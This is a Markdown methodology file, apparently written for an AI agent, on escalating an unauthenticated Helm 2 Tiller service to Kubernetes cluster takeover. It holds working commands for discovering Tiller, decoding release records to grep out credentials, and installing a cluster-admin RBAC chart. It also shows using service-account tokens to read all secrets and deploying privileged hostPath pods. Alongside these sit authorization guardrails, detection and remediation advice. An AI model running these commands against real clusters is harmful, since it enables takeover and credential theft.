---
technology: "Helm 2 Tiller"
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: container-orchestration
version: "1.1"
last-refresh: "2026-11-19"
provenance: "upstream-only; zero corpus evidence by design (owner-approved bucket-2 new-unit wave 2026-11-13) — Helm 2 client workflow per v2.helm.sh docs, permissive-default history per helm.sh FAQ, helm-tiller-pwn usage and chart contents per Ruil1n/helm-tiller-pwn upstream + rewritten from HackTricks (src/network-services-pentesting/44134-pentesting-tiller-helm.md), CC BY-NC 4.0, accessed 2026-11-13. v1.1 supplement 2026-11-19: TTP-first expansion (discovery-beyond-the-port, client-craft decision tree, RBAC-ceiling enumeration, evidence standards, detection artifacts, CTF notes) — current-year Helm advisories (CVE-2026-35204/35205/35206, -63308) confirmed Helm-3/4-CLI-only and out of scope for Tiller; claude-opus-4-8"
---

# Tiller bug-bounty methodology

Companion overview: [[tiller]]. Parent surface: [[kubernetes]] — this file is the 44134 escalation primitive inside that methodology.

Scope: discovering Tiller from inside a cluster or across the network, installing a Helm 2 client, enumerating releases, and converting an unauthenticated Tiller into cluster takeover within its RBAC ceiling.

## Phase 0 — Tooling

A **Helm 2 client** (v2 releases from the Helm project — a Helm 3 client does not implement the Tiller protocol), `kubectl` if you already hold any cluster credentials, and `nmap` for the network-only path.

## Phase 1 — Discovery

From inside the cluster (any pod or any namespace you can list):

```bash
kubectl get pods -n kube-system | grep -i tiller
kubectl get services -n kube-system | grep -i tiller
# broaden to other namespaces if the cluster forbids nothing:
kubectl get pods -A 2>/dev/null | grep -i tiller
```

The canonical shape is `tiller-deploy-...` (pod) and `tiller-deploy` (ClusterIP service, `44134/TCP`). From the network alone:

```bash
sudo nmap -sS -p 44134 198.51.100.60
```

Where 44134 answers from outside the cluster, look for how it was exposed (NodePort, ExternalName, load balancer, or a flat pod network) — that exposure is a finding independent of what you do next.

## Phase 2 — Client setup and enumeration

Install a Helm 2 client (package manager or the matching binary from the project's releases) and point it at the service:

```bash
export HELM_HOST=tiller-deploy.kube-system:44134
helm version          # server version comes back from Tiller itself
helm list             # installed releases across namespaces
helm get <release>    # chart, values, and rendered manifests for one release
```

If TLS was configured for Tiller, an unauthenticated client is rejected here — that is the point to stop and re-evaluate the ceiling rather than assuming the default. Absent TLS, there is no further gate: list/get disclose every release's values (templated credentials live there more often than anyone admits), and install applies manifests as Tiller's service account.

## Phase 3 — Cluster takeover within Tiller's RBAC ceiling

The ceiling question decides everything: what does Tiller's service account actually hold? Legacy default installs were permissive by project policy; hardened ones were not. The fastest honest check when you hold any cluster read is `kubectl auth can-i --list` as Tiller's service account (or read its ClusterRole/RoleBindings). Then:

```bash
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
```

The `pwnchart` chart's templates apply a ClusterRole and ClusterRoleBinding granting the `default` service account cluster-wide privileges — **inspect its `clusterrole.yaml` and `clusterrolebinding.yaml` before running it**; it is a maximal grant, and on a shared test cluster it widens access for everyone. The install succeeds only if Tiller itself is allowed to create RBAC objects: this path does not make every Tiller cluster-admin, it makes you whatever Tiller is. With the binding in place, the default service account in the workload namespace acts with those privileges — your foothold pod escalates without ever touching Tiller again:

```bash
# from a pod using the default service account:
kubectl --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --server=https://kubernetes.default.svc --insecure get ns
```

Where RBAC-object creation is denied but pods are not, the same primitive degrades to installing a privileged chart directly (hostPath mount, `privileged: true`, hostNetwork) — same ceiling logic, different manifest.

## Phase 4 — Persistence and cleanup notes

- Releases created through Tiller persist in its release storage in `kube-system` (Tiller-owned ConfigMaps or Secrets named for the release) — deleting the chart does not delete what the binding already granted; unwind RBAC objects explicitly.
- Tiller ops are one channel the [[kubernetes]] control plane does not attribute to you — in clusters with audit logging, they appear as Tiller's service account, which is both the persistence argument and the blue-team detection angle (report: Helm/Tiller service-account actions on RBAC objects are high-signal audit events).
- Remediation for the report: migrate to Helm 3 (Tiller removed), or — where migration is impossible — Tiller TLS with client cert verification plus a least-privilege service account and namespace scope, and 44134 reachable only from the operator subnet.

---

## Supplement — legacy-but-live TTP (added 2026-11-19)

*Tiller is end-of-life (Helm 2 support ended November 2020) and absent from every greenfield cluster, yet it keeps surfacing: unmigrated legacy clusters, acquired estates, air-gapped installs frozen on an old chart pipeline, and k8s CTF boxes where it is a genre staple. This supplement is the field craft for those encounters — finding Tiller when it is not answering on 44134, proving what its service account can reach before you touch RBAC, and capturing evidence that survives triage. The content priority is technique, not CVE archaeology: Tiller's danger was never a CVE, it was the deployment default. Nothing above is rewritten; this extends Phases 1–4.*

### Where the money is (Tiller triage priority)

Tiller is a single primitive, not a surface — but what it is *worth* depends entirely on its RBAC ceiling, so triage by what the service account holds, not by the fact that 44134 answers.

| Priority | Finding | Shape | Typical severity |
|---|---|---|---|
| 1 | Unauthenticated Tiller with cluster-wide RBAC (incl. `secrets`, RBAC-object create) | `helm --host` lists/installs; SA bound to `cluster-admin` | Critical (cluster takeover) |
| 2 | Unauthenticated Tiller that can read Secrets cluster-wide | `helm get` on releases + Tiller SA `get secrets` | High–Critical (credential harvest) |
| 3 | Release-values disclosure via `helm get values` | templated DB/cloud creds in rendered values | High |
| 4 | Tiller reachable off-cluster (NodePort / LB / flat pod net) on 44134 | exposure independent of RBAC | Medium–High |
| 5 | Namespace-scoped Tiller (hardened) still installing workloads | limited to its namespace, but pod-create = node foothold | Medium |
| 6 | TLS-less Tiller as an audit-blind deploy channel | actions attributed to Tiller SA, not you | Medium (detection/persistence note) |
| 7 | Stale Tiller RBAC objects with no running Tiller pod | orphaned `cluster-admin` binding to `tiller` SA | Low–Medium (hygiene) |

The honest rule: **Tiller makes you whatever Tiller is.** A namespace-scoped Tiller on a hardened cluster is a Medium; the copy-pasted quickstart install — `cluster-admin` bound to the `tiller` service account — is a full cluster takeover. Enumerate the ceiling (3.0 below) *before* you write the title.

### Phase 1 supplement — discovery beyond the port

Port 44134 answering is the easy case. The valuable finds are where the service is renamed, the port is firewalled from your segment but reachable from a pod you control, or Tiller is gone but its release records and RBAC grants remain. Work these in order:

**1.a — Tiller by workload, not by name.** The `tiller-deploy` name is a convention, not a guarantee; operators rename it, and some run it as a sidecar. Fingerprint by the container image and the port instead:

```bash
# image name is the reliable tell — gcr.io/kubernetes-helm/tiller:v2.x
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}' \
  2>/dev/null | grep -i tiller
# any container exposing 44134, whatever it is called
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{"\t"}{.spec.containers[*].ports[*].containerPort}{"\n"}{end}' \
  2>/dev/null | grep 44134
```

**1.b — Tiller's fingerprint in release storage (works even with zero network to 44134).** Tiller keeps release state *in the cluster*, labelled `OWNER=TILLER`, in the namespace Tiller runs in (default `kube-system`). This is the single most reliable "was Helm 2 here" signal, and it survives the Tiller pod being deleted:

```bash
# ConfigMap storage (the v2 default) and Secret storage (--storage=secret) both carry the label
kubectl get configmaps -A -l OWNER=TILLER 2>/dev/null
kubectl get secrets    -A -l OWNER=TILLER 2>/dev/null
# release records are named <release>.v<revision>
# e.g.  my-app.v1  my-app.v2  monitoring.v7
```

Each record names a release and its revision count — that is your `helm list` without a client, and it tells you what Tiller deployed (and therefore what its SA had to be allowed to create). If you see `OWNER=TILLER` Secrets but no Tiller pod, you have found a **migration that was never finished**: the release storage and, usually, the `cluster-admin`-bound `tiller` service account are still there (priority 7 above) — check for the orphaned binding in 3.0.

**1.c — read a release record without a Helm client.** When you hold cluster read but cannot install a Helm 2 binary, decode the record directly. The reliable path is always `helm get` (see Phase 2); the manual decode is the fallback. The payload is base64-of-gzip-of-protobuf:

```bash
# ConfigMap storage: one base64 layer, then gunzip -> protobuf (strings are readable)
kubectl get configmap my-app.v1 -n kube-system -o jsonpath='{.data.release}' \
  | base64 -d | gunzip | strings | grep -iE 'password|token|secret|key|AKIA|-----BEGIN'

# Secret storage: kubectl base64-wraps the value, so decode twice, then gunzip
kubectl get secret my-app.v1 -n kube-system -o jsonpath='{.data.release}' \
  | base64 -d | base64 -d | gunzip | strings | grep -iE 'password|token|-----BEGIN'
```

The rendered manifests and the supplied values both live in that protobuf — templated credentials included. `strings | grep` is enough for a PoC; you do not need to parse the protobuf cleanly to prove disclosure.

**1.d — the off-cluster path.** From the network only, 44134 is a bare gRPC port — no HTTP banner, no nmap service probe that fingerprints it as Tiller. An open 44134 is the signal; confirmation comes from a Helm 2 client handshake (Phase 2), not from `-sV`:

```bash
sudo nmap -sS -p 44134 198.51.100.60            # open = candidate
sudo nmap -sV -p 44134 198.51.100.60            # version probe is usually inconclusive — gRPC says little
```

If 44134 answers from outside the pod network, record *how* it is exposed (`kubectl get svc -A -o wide | grep 44134` for NodePort/LoadBalancer; an ExternalName or a flat CNI for the rest) — that exposure is a finding on its own, before you authenticate.

### Phase 2 supplement — client-craft, and what each command proves

Two ways to reach Tiller for authorized testing. Prefer the port-forward: it is low-volume, scoped to your kubeconfig context, and leaves a clean audit trail you can point to in the report.

```bash
# Path A — forward the service through your existing cluster creds, then talk to localhost
kubectl port-forward -n kube-system svc/tiller-deploy 44134:44134 &
helm --host localhost:44134 version
helm --host localhost:44134 ls --all

# Path B — straight at the in-cluster service DNS (from a pod, or a routable segment)
export HELM_HOST=tiller-deploy.kube-system:44134
helm version
```

Each command is a probe with a specific meaning for the ceiling — read the result as evidence, not just output:

| Command | What a success *proves* | What a failure means |
|---|---|---|
| `helm version` | Tiller is reachable and speaking v2 gRPC unauthenticated | TLS-gated (handshake error) → stop, re-scope: this is a hardened install |
| `helm ls --all` | Tiller SA can **read** release storage across namespaces (read ceiling) | RBAC-limited Tiller, or Secret storage your SA can't read |
| `helm get <rel>` / `helm get values <rel>` | **disclosure** — rendered manifests + supplied values, where templated creds live | release exists but storage unreadable |
| `helm get manifest <rel>` | exactly what Tiller applied (your map of its blast radius) | — |
| `helm history <rel>` | revision trail (rollback targets, prior values) | — |
| `helm install ... --dry-run --debug` | renders a chart **without applying** — proves install reachability at zero write | — |
| `helm install <chart>` (real) | Tiller SA can **create** objects (write ceiling) — the takeover gate | create denied → Tiller write-limited; degrade to read-only reporting |

The discipline: run the *reads* first and in full (`version`, `ls`, `get`, `get values`, `history`), then gate any write behind an explicit `--dry-run`. A `--dry-run` install that renders successfully proves the channel is live and tells you what would be applied — frequently that is enough evidence to report without ever creating an object on the target. On a bounty program, stop there and report; go to a real `install` only where the rules of engagement permit state change and you have decided the write ceiling is the finding.

**TLS-enabled Tiller.** If `helm version` returns a transport/handshake error rather than a server version, Tiller was configured with `--tiller-tls --tiller-tls-verify` and rejects unauthenticated clients. That is the designed gate — note it as the secure baseline and do not treat the open port as a finding. A client with a valid cert uses `helm --host <h> --tls --tls-ca-cert ca.cert.pem --tls-cert cert.pem --tls-key key.pem ...`; absent those materials, the ceiling is closed from your position.

### Phase 3 supplement — the RBAC-ceiling decision tree (enumerate before you report)

This is the paragraph that separates a Critical from a Medium, and it is the step most reports skip. **Before** installing anything, establish exactly what Tiller's service account holds. The order:

```bash
# 1. Which SA does the Tiller pod run as?  (default install: `tiller` in kube-system)
kubectl get deploy tiller-deploy -n kube-system -o jsonpath='{.spec.template.spec.serviceAccountName}{"\n"}'

# 2. What can that SA do?  Ask the API directly, impersonating it (needs impersonate right)
kubectl auth can-i --list --as=system:serviceaccount:kube-system:tiller

# 3. No impersonate right?  Read the bindings and roles by hand.
kubectl get clusterrolebindings -o json \
  | jq -r '.items[] | select(.subjects[]?.name=="tiller") | "\(.metadata.name) -> \(.roleRef.name)"'
# the smoking gun: tiller -> cluster-admin
kubectl get clusterrolebinding --no-headers 2>/dev/null | grep -i tiller
```

Then branch on the answer:

- **Tiller SA → `cluster-admin`** (the copy-pasted quickstart default on RBAC clusters). Full takeover is in reach: Tiller can read every Secret and create RBAC objects. This is priority 1. The proof-of-write is the next subsection — but you may not even need it: cluster-admin on the Tiller SA is itself the headline finding, demonstrable with reads alone.
- **Tiller SA has `get/list secrets` cluster-wide but not RBAC-object create.** Priority 2: harvest credentials through `helm get values` and direct Secret reads via the Tiller channel; you cannot mint new privileges, but reading every Secret in the cluster is High–Critical on its own.
- **Tiller SA namespace-scoped** (`--tiller-namespace`, a `RoleBinding` not a `ClusterRoleBinding`). Priority 5: you are confined to that namespace, but a pod-create there is still a node-foothold primitive (hostPath/privileged chart) — same logic, smaller blast radius.
- **Create denied entirely.** Tiller is a read/disclosure finding, not a takeover. Report honestly at that ceiling.

**What a release proves — read vs. write, for the report.** Keep the two claims distinct and evidence each separately:

- *Read claim* ("Tiller discloses cluster data"): evidenced by `helm get values <release>` output showing a credential, or a Secret read through the Tiller SA. No object is created.
- *Write claim* ("Tiller grants cluster takeover"): evidenced by a release you created — ideally a benign marker (a single ConfigMap in a namespace you name, labelled for cleanup), **not** the maximal RBAC chart. A `--dry-run` that renders plus the `can-i` output is often sufficient; a benign real install closes any doubt without widening access.

### Phase 3 supplement — the takeover primitive, with guardrails

The `helm-tiller-pwn` chart (already covered above) is the maximal, destructive demonstration: its `clusterrole.yaml` grants `['*'] on ['*']` and its `clusterrolebinding.yaml` binds that to the `default` service account in `kube-system`. On a shared or CTF cluster that is fine; on a client's production cluster it is a live privilege grant to every workload using that SA and should **not** be your PoC. Prefer the minimal proof:

```bash
# MINIMAL write proof — a benign, self-labelled marker release, trivially reversible
cat > ./proof/templates/marker.yaml <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: tiller-write-proof
  namespace: default
  labels: { pentest-cleanup: "true" }
data: { note: "install reachability demonstrated via unauthenticated Tiller" }
EOF
helm --host localhost:44134 install --name tiller-proof ./proof --dry-run --debug   # render first
helm --host localhost:44134 install --name tiller-proof ./proof                     # then, if RoE allows
```

If — and only if — the engagement explicitly authorizes demonstrating RBAC escalation, the maximal chain is: install a chart whose template creates a `ClusterRoleBinding` from a service account you control to `cluster-admin`, then use that SA token from your foothold pod. The token path and API call:

```bash
# from a pod running under the SA the binding elevated:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/kube-system/secrets" | jq '.items[].metadata.name'
# or, with kubectl available in the pod:
kubectl --token="$TOKEN" --server="$APISERVER" \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt get secrets -A
```

Where RBAC-object creation is denied but pod creation is not, the primitive degrades (as noted in Phase 3 above) to a privileged-workload chart — `hostPath: { path: / }`, `securityContext: { privileged: true }`, `hostNetwork: true`, `hostPID: true` — which turns a pod-create into a node-root foothold without ever touching RBAC. Same ceiling logic, different manifest; always `--dry-run` first.

### Evidence standards for a cluster-takeover claim

Triagers downgrade "I had cluster-admin" when the proof is a wall of RBAC objects you created. Capture tightly:

1. **The ceiling, first.** `kubectl auth can-i --list --as=system:serviceaccount:kube-system:tiller` output, or the `tiller -> cluster-admin` binding — this is the root-cause evidence and it requires no writes.
2. **Reachability.** `helm --host ... version` showing the server version returned by Tiller unauthenticated (the handshake succeeding is the point).
3. **Disclosure, if claimed.** One `helm get values <release>` excerpt with the credential redacted to prove the shape (`password: ****` with enough context to show it was real), not the raw secret dumped.
4. **Write, if claimed.** The benign marker release's `helm status`/`kubectl get cm tiller-write-proof`, then its deletion (`helm delete --purge tiller-proof`) in the same evidence block — show you cleaned up.
5. **Never** exfiltrate Secrets wholesale, create the maximal RBAC chart on a production target, or leave releases/bindings behind. Releases persist in `kube-system` storage; bindings persist until explicitly removed. Unwind everything and say so.

### Detection artifacts (blue-team framing for the report)

The reporting value multiplies when you hand the defender the detections, because Tiller's whole problem is that it launders your actions:

- **Attribution laundering is the headline.** Every object Tiller creates is attributed in the audit log to Tiller's service account (`system:serviceaccount:kube-system:tiller`), never to you. That is simultaneously the persistence argument and the detection: alert on `tiller` SA performing `create`/`update` on `clusterrolebindings`, `clusterroles`, `secrets`, or privileged pods — a legitimately-used Tiller rarely touches RBAC objects.
- **Network signal.** Unexpected clients connecting to `tiller-deploy:44134`, or any 44134 exposure outside the cluster, is high-signal — the port should only ever see the operator's Helm client.
- **Release-storage churn.** New `OWNER=TILLER` ConfigMaps/Secrets appearing in `kube-system` outside a known deploy window; correlate `helm history` revisions against change tickets.
- **The absence of TLS** is itself the finding to report defensively: a TLS-less Tiller is an unauthenticated, unattributed deploy channel. Recommend `--tiller-tls-verify`, or — the real fix — Helm 3.

### CTF notes — Tiller as a k8s-genre staple

Tiller is a recurring pattern on Kubernetes CTF boxes and cloud-security labs, precisely because the insecure default is self-contained and deterministic. The canonical arc:

1. You land in a pod (web RCE, SSRF to the kubelet, a leaked kubeconfig) with **no useful RBAC of your own** — `kubectl auth can-i --list` is nearly empty.
2. Service enumeration from the pod finds `tiller-deploy.kube-system:44134` reachable (`nc -vz tiller-deploy.kube-system 44134`, or the DNS resolves and the port is open).
3. You drop a Helm 2 client into the pod (or port-forward out), point `helm --host` at Tiller, and it answers unauthenticated.
4. Tiller is `cluster-admin` (the lab's whole point), so you install a chart that binds your pod's `default` SA to `cluster-admin`, then read the flag Secret with the SA token.

**What differs CTF vs. bounty:** on a box, the maximal `helm-tiller-pwn` chart is the intended solution — fire it. On a real program, it is a live, shared privilege grant you must not deploy; you prove the ceiling with reads and a benign marker instead, and the "flag" is a redacted credential plus the audit-attribution writeup. The box rewards the loudest path; the engagement rewards the quietest sufficient proof. Same primitive, opposite evidence discipline.

### A note on current-year advisories

Tiller's risk was never a CVE — it was the deployment default (an unauthenticated, cluster-admin gRPC service), which no patch addresses and only Helm 3 removes. The current-year Helm advisories (CVE-2026-35204 plugin-metadata path traversal, CVE-2026-35205 plugin signature verify-fails-open, CVE-2026-35206 chart-extraction directory traversal, CVE-2026-63308 empty-chart DoS; all fixed in the Helm 4.1.4 / 4.2.2 line) are **Helm-client/Helm-3-4 issues and do not apply to Tiller** — they are listed here only so you do not mis-cite a modern Helm-client CVE against a Helm 2 Tiller target. If a report needs a version anchor, the correct one is simply "Helm 2 / Tiller, end-of-life since November 2020, no security support."

### References (supplement)

- Helm 2 — Securing your Helm Installation (TLS, `--storage=secret`, RBAC) — https://v2.helm.sh/docs/securing_installation/
- Helm 2 — Role-Based Access Control (the `tiller` SA / `cluster-admin` quickstart and its warnings) — https://v2.helm.sh/docs/rbac/
- HackTricks — 44134 Pentesting Tiller (Helm) — https://hacktricks.wiki/network-services-pentesting/44134-pentesting-tiller-helm.html
- Ruil1n/helm-tiller-pwn (maximal ClusterRole/ClusterRoleBinding chart) — https://github.com/Ruil1n/helm-tiller-pwn
- Angus Lees — Helm security (any pod can ask Tiller to create ClusterRoles) — https://github.com/anguslees/helm-security-post
- Helm 4.1.4 release advisories (CVE-2026-35204/35205/35206), confirmed Helm-client scope, not Tiller — https://github.com/helm/helm/security/advisories

*Supplement added 2026-11-19. Sources: Helm 2 docs (v2.helm.sh securing_installation, rbac), HackTricks 44134 Tiller page, Ruil1n/helm-tiller-pwn upstream, Angus Lees' Helm security write-up, and the Helm 4.1.4/4.2.2 GitHub advisories (verified Helm-3/4-CLI-only, out of scope for Tiller). Current-year advisory check performed per brief; no Tiller-specific current-year CVE exists (Helm 2 EOL November 2020). Drafted by claude-opus-4-8.*
